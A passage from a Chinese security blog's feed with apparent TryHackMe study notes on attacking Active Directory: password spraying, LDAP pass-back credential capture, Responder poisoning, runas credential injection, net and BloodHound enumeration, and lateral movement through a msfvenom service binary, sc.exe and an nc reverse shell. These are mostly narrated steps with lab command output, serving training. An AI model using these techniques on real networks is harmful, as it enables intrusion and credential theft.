远程创建服务</li></ul><p><strong>服务的概念</strong></p><p>在Windows操作系统中，服务（Service）是一种在后台运行的程序或进程，它可以执行各种系统任务、管理资源、提供功能或服务。服务通常在系统启动时自动启动，并在后台持续运行，不需要用户干预。</p><p>服务可以是操作系统自带的，也可以是第三方软件安装时创建的。它们可以执行各种任务，例如网络连接、打印机管理、安全性控制、文件共享等。服务通常以独立的进程运行，拥有自己的权限和配置设置。</p><p>你可以通过服务管理器（Services Manager）来查看、启动、停止、暂停或更改服务的配置。在Windows操作系统中，你可以通过服务来管理系统的各种功能和任务，确保系统的正常运行和提供所需的服务。</p><p>请注意，对于一些高级或敏感的服务，修改或停止它们可能需要管理员权限或特殊的访问权限。</p><p>这里的话我主要总结一下这个thm的操作流程 是<strong>怎么一步一步横向移动到管理员iis这个域的</strong></p><p>首先了 我们通过各种各样的方法 获取到了两个凭证 </p><ul><li>一个是别的域的普通用户</li><li>一个是IIS域的管理用户</li></ul><p><strong>我们这里使用的sc.exe来在管理用户的电脑下创建一个恶意服务   以下是过程</strong></p><p>首先我们现在自己的linux机器上使用msfvenom创建一个恶意服务exe文件</p><p>然后使用smb协议使其传送到 THMIIS 域的 ADMIN$ 共享(就是管理员账户下的)</p><p>然后监听这个恶意服务的端口</p><p>因为使用这个sc.exe来创建服务的需要管理员权限  我们目前只能ssh普通用户</p><p>因为我们有了这个管理员的凭证 所以可以使用之前学到的runas这个工具 来使用这个管理员账户的权限 并且使用的一些指令就不用继续验证凭证了(<strong>说明只有管理员能执行的指令我们也能了</strong>)</p><p>那么我们就进行nc命令 在自己的linux主机下进行监听  </p><p>那么这个反弹shell的话就能反弹到管理员权限的shell了</p><p>(这里收到)</p><p>那么我们就能执行sc.exe来创建服务了 然后在运行 之前监听恶意服务的linux主机就会收到 然后就能访问管理员账户的主机里的任何内容了</p><p><strong>(这里使用这个反弹shell来获取管理员账户是因为这个nc命令的话执行需要管理员权限)</strong></p><h2 id="使用-WMI-横向移动"><a href="#使用-WMI-横向移动" class="headerlink" title="使用 WMI 横向移动"></a>使用 WMI 横向移动</h2><p>这个的话我觉得比上面的那个sc.exe方法更加方便</p><p>使用条件和上面的那个sc.exe方法差不多</p><ul><li>都是得获取到两个账户 一个是管理员一个是普通用户  </li><li>但是这里少了一步就是需要弹shell获取到这个system32</li><li>所以就方便在了这里</li></ul><h2 id="使用替代认证材料"><a href="#使用替代认证材料" class="headerlink" title="使用替代认证材料"></a>使用替代认证材料</h2><p>这个的话主要讲的就是这个AD域的两种身份验证登录协议</p><ul><li>NTLM</li><li>Kerberos</li></ul><p>一共就是这两种协议 </p><p>先是了解一下这两种协议的认证过程 </p><ul><li>NTLM是拿NTLM—hash值来进行认证登录</li><li>Kerberos是拿票据来进行认证登录 </li></ul><p>在这两者之间就是如果获取到了 hash值 就是不用使用密码就可以进行登录了 </p><p><strong>(就是从普通用户  直接登录到管理员用户)</strong></p><h2 id="滥用用户行为"><a href="#滥用用户行为" class="headerlink" title="滥用用户行为"></a>滥用用户行为</h2><p>这里主要讲的就是三种方法</p><ul><li>就是在网络共享下 可能管理员会共享一些脚本或者exe文件</li><li>rdp劫持</li></ul><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul><li><p>ssh远程端口代理</p></li><li><p>ssh本地端口代理</p></li><li>socks端口代理</li><li>socat端口代理</li><li>隧道复杂漏洞<strong>(把上面的各种代理方法拿出来组合起来用)</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接上一课的枚举AD域信息后&lt;strong&gt;(就是域的信息收集&lt;/strong&gt;)  开始进行横向移动和翻转了&lt;/p&gt;
&lt;h2 id=&quot;网络移动-横向移动&quot;&gt;&lt;a href=&quot;#网络移动-横向移动&quot; class=&quot;headerlink&quot; title=&quot;网络移动 (横向移动)&quot;</summary>
      
    
    
    
    
    <category term="thm-windows横向移动和翻转" scheme="https://ke1nys.github.io/tags/thm-windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E7%BF%BB%E8%BD%AC/"/>
    
  </entry>
  
  <entry>
    <title>thm-枚举AD域</title>
    <link href="https://ke1nys.github.io/posts/180ab89e.html"/>
    <id>https://ke1nys.github.io/posts/180ab89e.html</id>
    <published>2023-09-07T08:41:18.000Z</published>
    <updated>2023-09-15T09:32:43.394Z</updated>
    
    <content type="html"><![CDATA[<p>继上一篇的破坏AD域后  接下来写这个枚举AD域</p><h2 id="为什么要进行-AD-枚举"><a href="#为什么要进行-AD-枚举" class="headerlink" title="为什么要进行 AD 枚举"></a>为什么要进行 AD 枚举</h2><p>前面跟着进行配置就好了</p><p>这里的话给了AD域的凭证 就是账号密码  直接就可以进行登录了</p><p><strong>(这个域用户的主机开启了ssh和RDP服务 我们可以直接连接其电脑)</strong></p><h2 id="凭证注入"><a href="#凭证注入" class="headerlink" title="凭证注入"></a>凭证注入</h2><p>这里的讲的就是在获取域凭证之后 利用RDP或者SSH登录后  来在该域中添加一个新的域用户(<strong>就是我们自己</strong>)  <strong>相当于后门吧</strong></p><p>在讨论 AD 对象和枚举之前，我们首先讨论凭据注入方法。从破坏 AD 网络中，您会发现凭据通常可以在不损害加入域的计算机的情况下找到。特定的枚举技术可能需要特定的设置才能工作。</p><p>需要一台 Windows 计算机。这将使我们能够使用几种内置方法来进行枚举和利用。在此网络中，我们将探索这些内置工具之一，称为 <code>runas.exe</code> 二进制文件。</p><h2 id="Runas-Explained-解释"><a href="#Runas-Explained-解释" class="headerlink" title="Runas Explained (解释)"></a>Runas Explained (解释)</h2><p>讲一下这个Runas这个工具的作用</p><ul><li><p>runas.exe 是 Windows 操作系统中的一个实用工具，用于以不同的用户身份运行程序或命令。它允许你在一个用户账户下以另一个用户账户的权限运行程序。</p><p>runas.exe 的主要功能是允许管理员或具有特定权限的用户在不切换用户账户的情况下执行某些任务。当你需要以管理员权限运行某个程序或命令时，可以使用 runas.exe 来提升权限，而不必完全切换到管理员账户。</p><p>在命令提示符或运行对话框中，你可以使用以下语法来运行 runas.exe：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas [/profile] [/env] [/netonly] [/savecred] [/smartcard] [/showtrustlevels] [/trustlevel] /user:&lt;UserName&gt; &lt;Command&gt;</span><br></pre></td></tr></table></figure><p>其中，/user:<UserName> 用于指定要以哪个用户账户的身份运行程序或命令，<Command> 是要运行的程序或命令。</p><p>需要注意的是，使用 runas.exe 运行程序或命令需要提供正确的用户凭据（例如用户名和密码），并且用户账户必须具有足够的权限来执行所需的操作。</p><p>请注意，由于 runas.exe 涉及到权限提升和用户凭据的使用，所以在使用时要小心，并确保只在可信任的环境中使用。</p></li></ul><p><strong>简单来说就是在我们控制的计算机下通过获取的凭证来执行任何想要执行的命令(域的名字也要知道)</strong></p><p>在安全评估中，您通常可以访问网络并刚刚发现 AD 凭据，但没有方法或权限来创建新的加入域的计算机。因此，我们需要能够在我们控制的 Windows 计算机上使用这些凭据。</p><p>如果我们有 : 格式的 AD 凭据，我们可以使用 Runas（一个合法的 Windows 二进制文件）将凭据注入到内存中。通常的 Runas 命令看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas.exe /netonly /user:&lt;domain&gt;\&lt;username&gt; cmd.exe</span><br></pre></td></tr></table></figure><ul><li>/netonly - 由于我们没有加入域，因此我们希望加载网络身份验证的凭据，但不针对域控制器进行身份验证。因此，在计算机上本地执行的命令将在标准 Windows 帐户的上下文中运行，但任何网络连接都将使用此处指定的帐户进行。</li><li>/user - 在这里，我们提供域和用户名的详细信息。使用完全限定域名 (FQDN) 而不仅仅是域的 NetBIOS 名称始终是一个安全的选择，因为这将有助于解决问题。</li><li>cmd.exe - 这是我们在注入凭据后要执行的程序。这可以更改为任何内容，但最安全的选择是 cmd.exe，因为您可以使用它来启动您想要的任何内容，并注入凭据。</li></ul><p>运行此命令后，系统将提示您提供密码。请注意，由于我们添加了 /netonly 参数，因此域控制器不会直接验证凭据，<strong>因此它将接受任何密码</strong>。我们仍然需要确认网络凭据是否已成功且正确加载。</p><p>注意：如果您使用自己的 Windows 计算机，则应确保以管理员身份运行第一个命令提示符。这会将管理员令牌注入到 CMD 中。如果您运行需要 Runas 生成的 CMD 本地管理权限的工具，则令牌将已经可用。这不会为您提供网络管理权限，但会确保您执行的任何本地命令都将以管理权限执行。</p><p>这样的好处就是在本地访问别的东西的时候是不需要向域控制器那边验证凭据了   直接就本地验证就行 </p><p><strong>(下面就是使用这个runas的好处)</strong></p><p><img src="../images/image-20230907174837605.png" alt="image-20230907174837605"></p><h2 id="通过-Microsoft-管理控制台进行枚举"><a href="#通过-Microsoft-管理控制台进行枚举" class="headerlink" title="通过 Microsoft 管理控制台进行枚举"></a>通过 Microsoft 管理控制台进行枚举</h2><p>这个就不多写了 就是通过RDP后  通过MMC来查看域的整个结果和人员服务器组成情况</p><h2 id="通过命令提示符进行枚举"><a href="#通过命令提示符进行枚举" class="headerlink" title="通过命令提示符进行枚举"></a>通过命令提示符进行枚举</h2><p>这里的前提都是在能登录到对方主机的前提下  ssh或者rdp</p><p>CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即 <code>net</code> 。 <code>net</code> 命令是一个枚举有关本地系统和 AD 信息的便捷工具。我们将看看从这个位置可以列举的一些有趣的事情，但这并不是一个详尽的列表。</p><p>我们可以使用 <code>net</code> 命令通过 <code>user</code> 子选项列出 AD 域中的所有用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">User accounts for \\THMDC</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">aaron.conway             aaron.hancock            aaron.harris</span><br><span class="line">aaron.johnson            aaron.lewis              aaron.moore</span><br><span class="line">aaron.patel              aaron.smith              abbie.joyce</span><br><span class="line">abbie.robertson          abbie.taylor             abbie.walker</span><br><span class="line">abdul.akhtar             abdul.bates              abdul.holt</span><br><span class="line">abdul.jones              abdul.wall               abdul.west</span><br><span class="line">abdul.wilson             abigail.cox              abigail.cox1</span><br><span class="line">abigail.smith            abigail.ward             abigail.wheeler</span><br><span class="line">[....]</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这将为我们返回所有 AD 用户，并有助于确定域的大小以进行进一步的攻击。我们还可以使用此子选项来枚举有关单个用户帐户的更详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user zoe.marshall /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">User name                    zoe.marshall</span><br><span class="line">Full Name                    Zoe Marshall</span><br><span class="line">Comment</span><br><span class="line">User&#x27;s comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2/24/2022 10:06:06 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2/24/2022 10:06:06 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships</span><br><span class="line">Global Group memberships     *Domain Users         *Internet Access</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>注意：如果用户只是少数 AD 组的一部分，此命令将能够向我们显示组成员身份。但是，通常，在超过十个组成员身份后，该命令将无法列出所有组成员。</p><p>我们可以使用 <code>net</code> 命令通过使用 <code>group</code> 子选项来枚举域的组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net group /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Group Accounts for \\THMDC</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">*Cloneable Domain Controllers</span><br><span class="line">*DnsUpdateProxy</span><br><span class="line">*Domain Admins</span><br><span class="line">*Domain Computers</span><br><span class="line">*Domain Controllers</span><br><span class="line">*Domain Guests</span><br><span class="line">*Domain Users</span><br><span class="line">[...]</span><br><span class="line">*Schema Admins</span><br><span class="line">*Server Admins</span><br><span class="line">*Tier 0 Admins</span><br><span class="line">*Tier 1 Admins</span><br><span class="line">*Tier 2 Admins</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这些信息可以帮助我们找到目标执行的特定群体。我们还可以通过在同一命令中指定组来枚举更多详细信息，例如组的成员身份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net group &quot;Tier 1 Admins&quot; /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Group name     Tier 1 Admins</span><br><span class="line">Comment</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">t1_arthur.tyler          t1_gary.moss             t1_henry.miller</span><br><span class="line">t1_jill.wallis           t1_joel.stephenson       t1_marian.yates</span><br><span class="line">t1_rosie.bryant</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>我们可以使用 <code>net</code> 命令通过 <code>accounts</code> 子选项枚举域的密码策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net accounts /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Force user logoff how long after time expires?:       Never</span><br><span class="line">Minimum password age (days):                          0</span><br><span class="line">Maximum password age (days):                          Unlimited</span><br><span class="line">Minimum password length:                              0</span><br><span class="line">Length of password history maintained:                None</span><br><span class="line">Lockout threshold:                                    Never</span><br><span class="line">Lockout duration (minutes):                           30</span><br><span class="line">Lockout observation window (minutes):                 30</span><br><span class="line">Computer role:                                        PRIMARY</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这将为我们提供有用的信息，例如：</p><ul><li>Length of password history kept. Meaning how many unique passwords must the user provide before they can reuse an old password.<br>保留的密码历史记录长度。这意味着用户必须提供多少个唯一密码才能重新使用旧密码。</li><li>The lockout threshold for incorrect password attempts and for how long the account will be locked.<br>错误密码尝试的锁定阈值以及帐户将被锁定的时间。</li><li>The minimum length of the password.<br>密码的最小长度。</li><li>The maximum age that passwords are allowed to reach indicating if passwords have to be rotated at a regular interval.<br>允许密码达到的最长期限，指示密码是否必须定期轮换。</li></ul><p><strong><code>net</code> 命令必须从加入域的计算机执行。如果计算机未加入域，则它将默认为 WORKGROUP 域。</strong></p><h2 id="通过-PowerShell-进行枚举"><a href="#通过-PowerShell-进行枚举" class="headerlink" title="通过 PowerShell 进行枚举"></a>通过 PowerShell 进行枚举</h2><p>这个懒得复制了  直接去thm直接看就行了</p><h2 id="通过-Bloodhound-进行枚举-这里说这个是目前最牛的工具"><a href="#通过-Bloodhound-进行枚举-这里说这个是目前最牛的工具" class="headerlink" title="通过 Bloodhound 进行枚举(这里说这个是目前最牛的工具)"></a>通过 Bloodhound 进行枚举(这里说这个是目前最牛的工具)</h2><p>这个工具确实牛逼   <strong>(使用条件)</strong></p><ul><li>能够ssh或者RDP目标主机  (就是获得到凭证了)</li><li>然后上传Sharphound脚本获取整个AD域的所有信息  </li><li>在linux上进行Bloodhound 工具进行查看</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;继上一篇的破坏AD域后  接下来写这个枚举AD域&lt;/p&gt;
&lt;h2 id=&quot;为什么要进行-AD-枚举&quot;&gt;&lt;a href=&quot;#为什么要进行-AD-枚举&quot; class=&quot;headerlink&quot; title=&quot;为什么要进行 AD 枚举&quot;&gt;&lt;/a&gt;为什么要进行 AD 枚举&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="thm-枚举AD域" scheme="https://ke1nys.github.io/tags/thm-%E6%9E%9A%E4%B8%BEAD%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>thm-破坏AD域</title>
    <link href="https://ke1nys.github.io/posts/7b844e49.html"/>
    <id>https://ke1nys.github.io/posts/7b844e49.html</id>
    <published>2023-09-04T11:58:06.000Z</published>
    <updated>2023-09-15T09:32:43.395Z</updated>
    
    <content type="html"><![CDATA[<p>上个星期刚把域控的部分看了一遍</p><p><img src="../images/image-20230904210903273.png" alt="image-20230904210903273"></p><p><strong>这是本题的这个网络拓扑图</strong></p><p>搭建环境就不多说了   跟着做就行了 </p><h2 id="破坏AD域的几种方法"><a href="#破坏AD域的几种方法" class="headerlink" title="破坏AD域的几种方法"></a>破坏AD域的几种方法</h2><p><img src="../images/image-20230905111806257.png" alt="image-20230905111806257"></p><p><img src="../images/image-20230905111654897.png" alt="image-20230905111654897"></p><p>以下技术来恢复此网络中的 AD 凭据：</p><h2 id="开源情报-OSINT-和网络钓鱼"><a href="#开源情报-OSINT-和网络钓鱼" class="headerlink" title="开源情报 (OSINT) 和网络钓鱼"></a>开源情报 (OSINT) 和网络钓鱼</h2><p>开始可以先从这里来获取情报</p><p>获取第一组 AD <strong>凭据</strong>的两种流行方法是开源情报 (OSINT) 和网络钓鱼</p><p>这些地方可能都会导致凭证泄露</p><p><strong>HaveIBeenPwned 和 DeHashed</strong> 等网站提供了出色的平台，可以确定某人的信息（例如工作电子邮件）是否曾经涉及公开的数据泄露事件。</p><h2 id="NTLM-验证服务"><a href="#NTLM-验证服务" class="headerlink" title="NTLM 验证服务"></a>NTLM 验证服务</h2><p>新技术 LAN 管理器 (NTLM) 是一套用于在 AD 中验证用户身份的安全协议。 NTLM 可用于通过使用称为 NetNTLM 的基于质询-响应的方案进行身份验证。这种身份验证机制被网络上的服务大量使用。但是，使用 NetNTLM 的服务也可以暴露在互联网上。以下是一些流行的例子：</p><ul><li>Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.<br>公开 Outlook Web App (OWA) 登录门户的内部托管 Exchange（邮件）服务器。</li><li>Remote Desktop Protocol (RDP) service of a server being exposed to the internet.<br>暴露于互联网的服务器的远程桌面协议（RDP）服务。</li><li>Exposed VPN endpoints that were integrated with AD.<br>与 AD 集成的公开 VPN 端点。</li><li>Web applications that are internet-facing and make use of NetNTLM.<br>面向互联网并使用 NetNTLM 的 Web 应用程序。</li></ul><p>NetNTLM，通常也称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和 AD 之间的中间人的角色。所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。</p><p>这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这可以防止应用程序存储 AD 凭据，<strong>该凭据应仅存储在域控制器上。这个过程如下图所示：</strong></p><p><img src="../images/c9113ad0ff443dd0973736552e85aa69.png" alt="img"></p><p>这个图很好的进行解释了</p><h2 id="暴力登录攻击"><a href="#暴力登录攻击" class="headerlink" title="暴力登录攻击"></a>暴力登录攻击</h2><p>这里的话我们采用的不是密码爆破 因为这样子账户被锁</p><p>这里采用的是密码喷射攻击 就是用同一个密码来爆破账户进行攻击</p><p><strong>(可以这样做的原因是因为刚入职的员工密码都是固定的  如果没有修改的话就可以爆破成功)</strong></p><p><strong>以下是更加详细的解释</strong></p><p>由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷射攻击。我们不会尝试多个不同的密码，这可能会触发帐户锁定机制，而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。但是，应该注意的是，由于这些类型的攻击将生成大量失败的身份验证尝试，因此可以检测到这些类型的攻击。</p><p><img src="../images/image-20230905113707762.png" alt="image-20230905113707762"></p><p>写个脚本 批量来打  这样就可以了</p><h2 id="LDAP-绑定凭证"><a href="#LDAP-绑定凭证" class="headerlink" title="LDAP 绑定凭证"></a>LDAP 绑定凭证</h2><p><img src="../images/image-20230905115048701.png" alt="image-20230905115048701"></p><p><strong>这是和NTLM协议的差别</strong></p><p>应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。 LDAP 身份验证与 NTLM 身份验证类似。但是，通过 LDAP 身份验证，应用程序可以直接验证用户的凭据。该应用程序有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。</p><p>LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。其中包括应用程序和系统，例如：</p><ul><li>Gitlab</li><li>Jenkins 詹金斯</li><li>Custom-developed web applications<br>定制开发的网络应用程序</li><li>Printers 打印机</li><li>VPNs VPN</li></ul><p><strong>这个的话比较方便  因为这个不是像NTLM协议一样限制于windows</strong></p><p>如果这些应用程序或服务中的任何一个暴露在互联网上，则可以使用与针对 NTLM 身份验证系统的攻击相同类型的攻击。然而，由于使用 LDAP 身份验证的服务需要一组 AD 凭据，因此它开辟了额外的攻击途径。本质上，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的经过身份验证的访问。通过LDAP进行认证的流程如下所示：</p><p><img src="../images/d2f78ae2b44ef76453a80144dac86b4e.png" alt="img"></p><h2 id="LDAP-Pass-back-Attacks-LDAP-回传攻击"><a href="#LDAP-Pass-back-Attacks-LDAP-回传攻击" class="headerlink" title="LDAP Pass-back Attacks LDAP 回传攻击"></a>LDAP Pass-back Attacks LDAP 回传攻击</h2><p>然而，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限（例如在会议室中插入恶意设备）时，这是针对网络设备（例如打印机）的常见攻击。</p><p>当我们访问指定 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些接口的凭据保留为默认凭据，例如 <code>admin:admin</code> 或 <code>admin:password</code> 。在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。</p><p>（<strong>使用这个攻击的话就是主要跟他的这个LDAP的两次绑定有关</strong>）</p><p>主要就是进行第一次绑定的LDAP请求绑定包的抓取</p><p><strong>(就是上面图片步骤2的过程)</strong></p><h3 id="执行LDAP回传"><a href="#执行LDAP回传" class="headerlink" title="执行LDAP回传"></a>执行LDAP回传</h3><p><img src="../images/image-20230905200039028.png" alt="image-20230905200039028"></p><p>假如我们插入了恶意设备  获取了这个打印机的后台设置界面</p><p>这里的话这个LDAP验证流程就和上面的那个图一样</p><p><strong>这里搭建的LDAP服务器的流程就不写了   thm直接自己看就行了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -SX -i breachad tcp port 389</span><br><span class="line">//抓包指令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在给出的命令 tcpdump -SX -i breachad tcp port 389 中，-i breachad 是一个选项用于指定要捕获数据包的网络接口。</span><br><span class="line">具体解释如下：</span><br><span class="line">-i：这是 tcpdump 命令中用于指定要捕获数据包的网络接口的选项。</span><br><span class="line">breachad：这是参数，表示要使用名为 &quot;breachad&quot; 的网络接口。通常，网络接口名称可以是网卡设备（例如 eth0、enp2s0）或其他虚拟接口。</span><br><span class="line">因此，在给定命令中，通过 -i breachad 指定了将从名为 &quot;breachad&quot; 的网络接口上捕获 TCP 端口号为 389 的数据包。</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230905201717038.png" alt="image-20230905201717038"></p><p>因为搭建LDAP恶意服务器的时候设置的明文传输  所以就抓包的时候就可以直接看到密码</p><h2 id="Authentication-Relays-身份验证中继"><a href="#Authentication-Relays-身份验证中继" class="headerlink" title="Authentication Relays 身份验证中继"></a>Authentication Relays 身份验证中继</h2><p>服务器消息块 (SMB) 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。在使用 Microsoft AD 的网络中，SMB 负责管理从网络间文件共享到远程管理的所有事务。即使当您尝试打印文档时计算机收到的“缺纸”警报也是 SMB 协议的作用。</p><p>然而，早期版本的 SMB 协议的安全性被认为是不够的。发现了多个漏洞和漏洞，可用于恢复凭据，甚至在设备上执行代码。尽管其中一些漏洞在协议的新版本中得到了解决，但组织通常不会强制使用更新的版本，因为遗留系统不支持它们。我们将研究使用 SMB 进行 NetNTLM 身份验证的两种不同漏洞：</p><ul><li>由于NTLM Challenges可以被拦截，我们可以使用离线破解技术来恢复与NTLM Challenge相关的密码。然而，这种破解过程比直接破解 NTLM 哈希要慢得多。</li><li>我们可以使用我们的流氓设备发起中间人攻击，在客户端和服务器之间中继 SMB 身份验证，这将为我们提供主动的经过身份验证的会话以及对目标服务器的访问。</li></ul><p><strong>这里接下来讲的东西有点难理解</strong></p><p>这里的话先讲一下这个在SMB期间发生的身份验证  我们将使用 <code>Responder</code> 尝试拦截 NetNTLM 挑战来破解它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LLMNR, NBT-NS, and WPAD LLMNR、NBT-NS 和 WPAD</span><br><span class="line"></span><br><span class="line">//这些就是在SMB身份验证期间可能会利用到的协议</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LLMNR（Link-Local Multicast Name Resolution）、NBT-NS（NetBIOS Name Service）和WPAD（Web Proxy Auto-Discovery）这几个协议在SMB（Server Message Block）身份验证过程中可能会被使用到。</p><ol><li>LLMNR：LLMNR是一种用于本地网络上主机名解析的协议。当Windows系统无法通过DNS解析主机名时，它会尝试使用LLMNR来寻找其他设备并获取其IP地址。攻击者可以利用LLMNR欺骗目标系统，并截获其发出的名称查询请求，从而进行中间人攻击或捕获用户凭据。</li><li>NBT-NS：NBT-NS是NetBIOS服务的一部分，在Windows操作系统中负责将NetBIOS名称转换为IP地址。类似于LLMNR，攻击者可以通过发送恶意响应来欺骗目标系统，并截取其发出的名称查询请求以获取敏感信息或执行中间人攻击。</li><li>WPAD：WPAD协议用于自动配置Web代理设置。客户端设备通常会根据DHCP服务器提供的选项、DNS记录或本地配置查找代理服务器。如果开启了WPAD功能且未正确配置安全控制，那么恶意用户可以利用此漏洞设置一个恶意代理服务器，并拦截所有流经该代理服务器的HTTP请求，包括SMB身份验证中的凭据信息。</li></ol><p>因此，攻击者可以利用LLMNR、NBT-NS和WPAD协议的弱点来执行中间人攻击或窃取用户凭据。为了提高安全性，建议在网络环境中禁用或限制这些协议，并采取其他安全措施（如启用加密通信）来保护SMB身份验证过程中的敏感信息</p><p>由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会收到这些请求。通常，这些请求会被简单地丢弃，因为它们不是针对我们的主机的。然而，响应者将主动侦听请求并发送有毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。通过毒害这些请求，Responder 尝试强制客户端连接到我们的 AttackBox。在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 